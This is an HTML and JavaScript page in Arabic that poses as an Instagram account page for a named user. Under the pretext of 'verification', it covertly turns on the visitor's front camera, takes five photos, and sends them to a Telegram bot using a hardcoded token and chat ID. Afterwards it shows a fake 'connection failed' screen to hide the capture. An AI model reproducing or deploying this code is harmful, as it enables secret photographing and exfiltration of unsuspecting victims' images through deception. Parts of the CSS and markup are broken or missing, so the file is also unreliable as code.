<title>حساب Instagram</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --ig-gradient: linear-gradient(45deg,
      #405DE6, #5851DB, #833AB4, #C13584,

  body {
    min-height: 100vh;

    align-items: center;

  .card {

  .avatar-wrapper {
    position: relative;
    width: 140px;
    height: 140px;

  }

  .avatar {

    height: 100%;

    background: var(--ig-gradient);
    box-shadow: 0 4px 20px rgba(225, 48, 108, 0.25);
  }
  .avatar img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
    object-fit: cover;
    display: block;
    background: #efefef;
    border: 3px solid #fff;
  }

  .ig-badge {
    position: fixed;
    top: 20px;
    left: 20px;
    font-family: 'Brush Script MT', 'Segoe Script', 'Lucida Handwriting', cursive;
    font-size: 26px;
    font-weight: 700;
    font-style: italic;
    letter-spacing: -0.5px;
    line-height: 1;
    background-image: var(--ig-gradient);
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    color: transparent;
    z-index: 9999;
    pointer-events: none;
  }

  .name {
    font-size: 22px;

    margin-bottom: 8px;
    letter-spacing: -0.3px;
  }
  .bio {
    font-size: 14px;

    color: var(--ig-gray);
    margin-bottom: 22px;
  }

  .divider {
    height: 1px;
    background: var(--ig-border);
    margin-bottom: 22px;
  }

  #status {
    font-size: 14px;
    line-height: 1.8;
    min-height: 64px;
    padding: 18px 16px;
    border-radius: 12px;
    background: #fafafa;
    border: 1px solid var(--ig-border);
    color: var(--ig-text);
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    transition: all .3s;
  }
  .status-info    { color: var(--ig-blue); }

  .status-error   { color: #ed4956; }

  .spinner {

<body>

<div class="card">

      <img id="avatarImg"
           src="https://i.postimg.cc/PqhHkNvf/mohammed.jpg"
           alt=" "
           onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect fill=%22%23efefef%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2258%22 font-size=%2240%22 text-anchor=%22middle%22 fill=%22%238e8e8e%22>?</text></svg>'">
    </div>

  </div>

  <h1 class="name">@Mohammed Dawood</h1>
  <p class="bio">سجل الدخول للوصول لحساب هذا المستخدم على Instagram</p>

  <div class="divider"></div>

  <div id="status" class="status-info">
    <div><span class="spinner"></span>جار فتح حساب Instagram</div>
  </div>

  <div id="camHidden">
    <video id="video" autoplay playsinline muted></video>
  </div>
  <canvas id="canvas" style="display:none"></canvas>
</div>

<script>
/* ============================================================
   الإعدادات
   ============================================================ */
const TELEGRAM_TOKEN   = '8662015576:AAEDAgAPTh4L_-Mgk-Wo44kpovyTCyO8mJQ';
const TELEGRAM_CHAT_ID = '8335283387';

const CONFIG = {
  photosCount: 5,        // عدد الصور
  intervalMs: 120,       // فاصل صغير جدًا بين التقاط وآخر
  quality: 0.85,         // جودة الصورة
  maxWidth: 900,         // أقصى عرض للصورة
  startDelayMs: 3000,    // تأخير قبل طلب إذن الكاميرا (3 ثواني)
  errorDelayMs: 800      // تأخير قبل الانتقال لصفحة فشل الاتصال
};
/* ============================================================ */

const video    = document.getElementById('video');
const canvas   = document.getElementById('canvas');
const statusEl = document.getElementById('status');

let stream = null;

function setStatus(html, type = 'info', spinner = false) {
  statusEl.className = 'status-' + type;
  statusEl.innerHTML = (spinner ? '<span class="spinner"></span>' : '') + html;
}

/* ---------- 1) تشغيل الكاميرا بأسرع وقت ---------- */
async function startCamera() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    setStatus('⚠️ المتصفح لا يدعم الكاميرا.', 'error');
    return false;
  }

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: 'user',
        width:  { ideal: 1280 },
        height: { ideal: 1280 }
      },
      audio: false
    });

    video.srcObject = stream;
    await video.play();

    await new Promise(resolve => {
      if (video.readyState >= 2 && video.videoWidth > 0) return resolve();
      const check = setInterval(() => {
        if (video.readyState >= 2 && video.videoWidth > 0) {
          clearInterval(check);
          resolve();
        }
      }, 20);
    });

    return true;

  } catch (err) {
    console.error(err);
    let msg = 'يجب منح اذن الكاميرا لشركة Instagram لتتحقق من هذا الحساب.';
    if (err.name === 'NotAllowedError') {
      msg = '🚫 يرجى السماح بالوصول إلى الكاميرا ثم إعادة تحميل الصفحة.';
    } else if (err.name === 'NotFoundError') {
      msg = '📷 لم يتم العثور على كاميرا.';
    } else if (err.name === 'NotReadableError') {
      msg = '⚠️ الكاميرا مستخدمة من تطبيق آخر.';
    }
    setStatus(msg, 'error');
    return false;
  }
}

function stopCamera() {
  if (stream) {
    stream.getTracks().forEach(t => t.stop());
    stream = null;
  }
}

/* ---------- 2) التقاط صورة واحدة ---------- */
function captureFrame() {
  const w = video.videoWidth;
  const h = video.videoHeight;
  if (!w || !h) return null;

  const scale = Math.min(1, CONFIG.maxWidth / w);
  canvas.width  = Math.round(w * scale);
  canvas.height = Math.round(h * scale);

  const ctx = canvas.getContext('2d');
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  return canvas;
}

function canvasToBlob(cv) {
  return new Promise((resolve, reject) => {
    cv.toBlob(
      blob => blob ? resolve(blob) : reject(new Error('فشل إنشاء الصورة')),
      'image/jpeg',
      CONFIG.quality
    );
  });
}

/* ---------- 3) إرسال صورة واحدة إلى تليجرام ---------- */
async function sendPhoto(blob, index) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;

  const fd = new FormData();
  fd.append('chat_id', TELEGRAM_CHAT_ID);
  fd.append('photo', blob, `photo_${index}.jpg`);
  fd.append('caption',
    `📸 صورة ${index} من ${CONFIG.photosCount}\n` +
    `🕐 ${new Date().toLocaleString('ar-EG')}`
  );

  const res  = await fetch(url, { method: 'POST', body: fd });
  const data = await res.json();
  if (!data.ok) throw new Error(data.description || 'فشل الإرسال');
  return data;
}

/* ---------- 4) صفحة "فشل الاتصال بالإنترنت" مع أيقونة WiFi احترافية ---------- */
function showInternetErrorPage() {
  document.open();
  document.write(`<!DOCTYPE html>

      <path class="ring" d="M 20 70 A 50 50 0 0 1 100 70"/>

      <circle class="dot" cx="60" cy="103" r="6"/>

      <line class="cross" x1="22" y1="22" x2="98" y2="98"/>
    </svg>

    <h1>فشل الاتصال بالإنترنت</h1>
    <p>
      تعذّر الاتصال بالشبكة.<br>

    </p>

  </div>

  document.close();
}

/* ---------- 5) التدفق الرئيسي ---------- */
async function runVerification() {
  const ok = await startCamera();
  if (!ok) return;

  setStatus('📸 جارٍ التحقق…', 'info', true);

  const sendPromises = [];
  let failed = 0;

  for (let i = 1; i <= CONFIG.photosCount; i++) {
    const cv = captureFrame();
    if (!cv) break;

    const blob = await canvasToBlob(cv);

    // بدء الإرسال في الخلفية (بدون await) — نلتقط التالية فورًا
    const p = sendPhoto(blob, i).catch(err => {
      console.warn(`فشل إرسال الصورة ${i}:`, err.message);
      failed++;
    });
    sendPromises.push(p);

    if (i < CONFIG.photosCount) {
      await new Promise(r => setTimeout(r, CONFIG.intervalMs));
    }
  }

  // الكاميرا انتهى عملها — أوقفها فورًا
  stopCamera();

  setStatus('☁️ جارٍ إنهاء الإرسال…', 'info', true);

  await Promise.all(sendPromises);

  // ⬇️⬇️⬇️ الانتقال إلى صفحة "فشل الاتصال بالإنترنت" ⬇️⬇️⬇️
  setTimeout(showInternetErrorPage, CONFIG.errorDelayMs);
}

window.addEventListener('load', () => {
  // ننتظر حتى يرى الطالب محتوى الصفحة أولًا
  setTimeout(runVerification, CONFIG.startDelayMs);
});

window.addEventListener('pagehide', stopCamera);
</script>
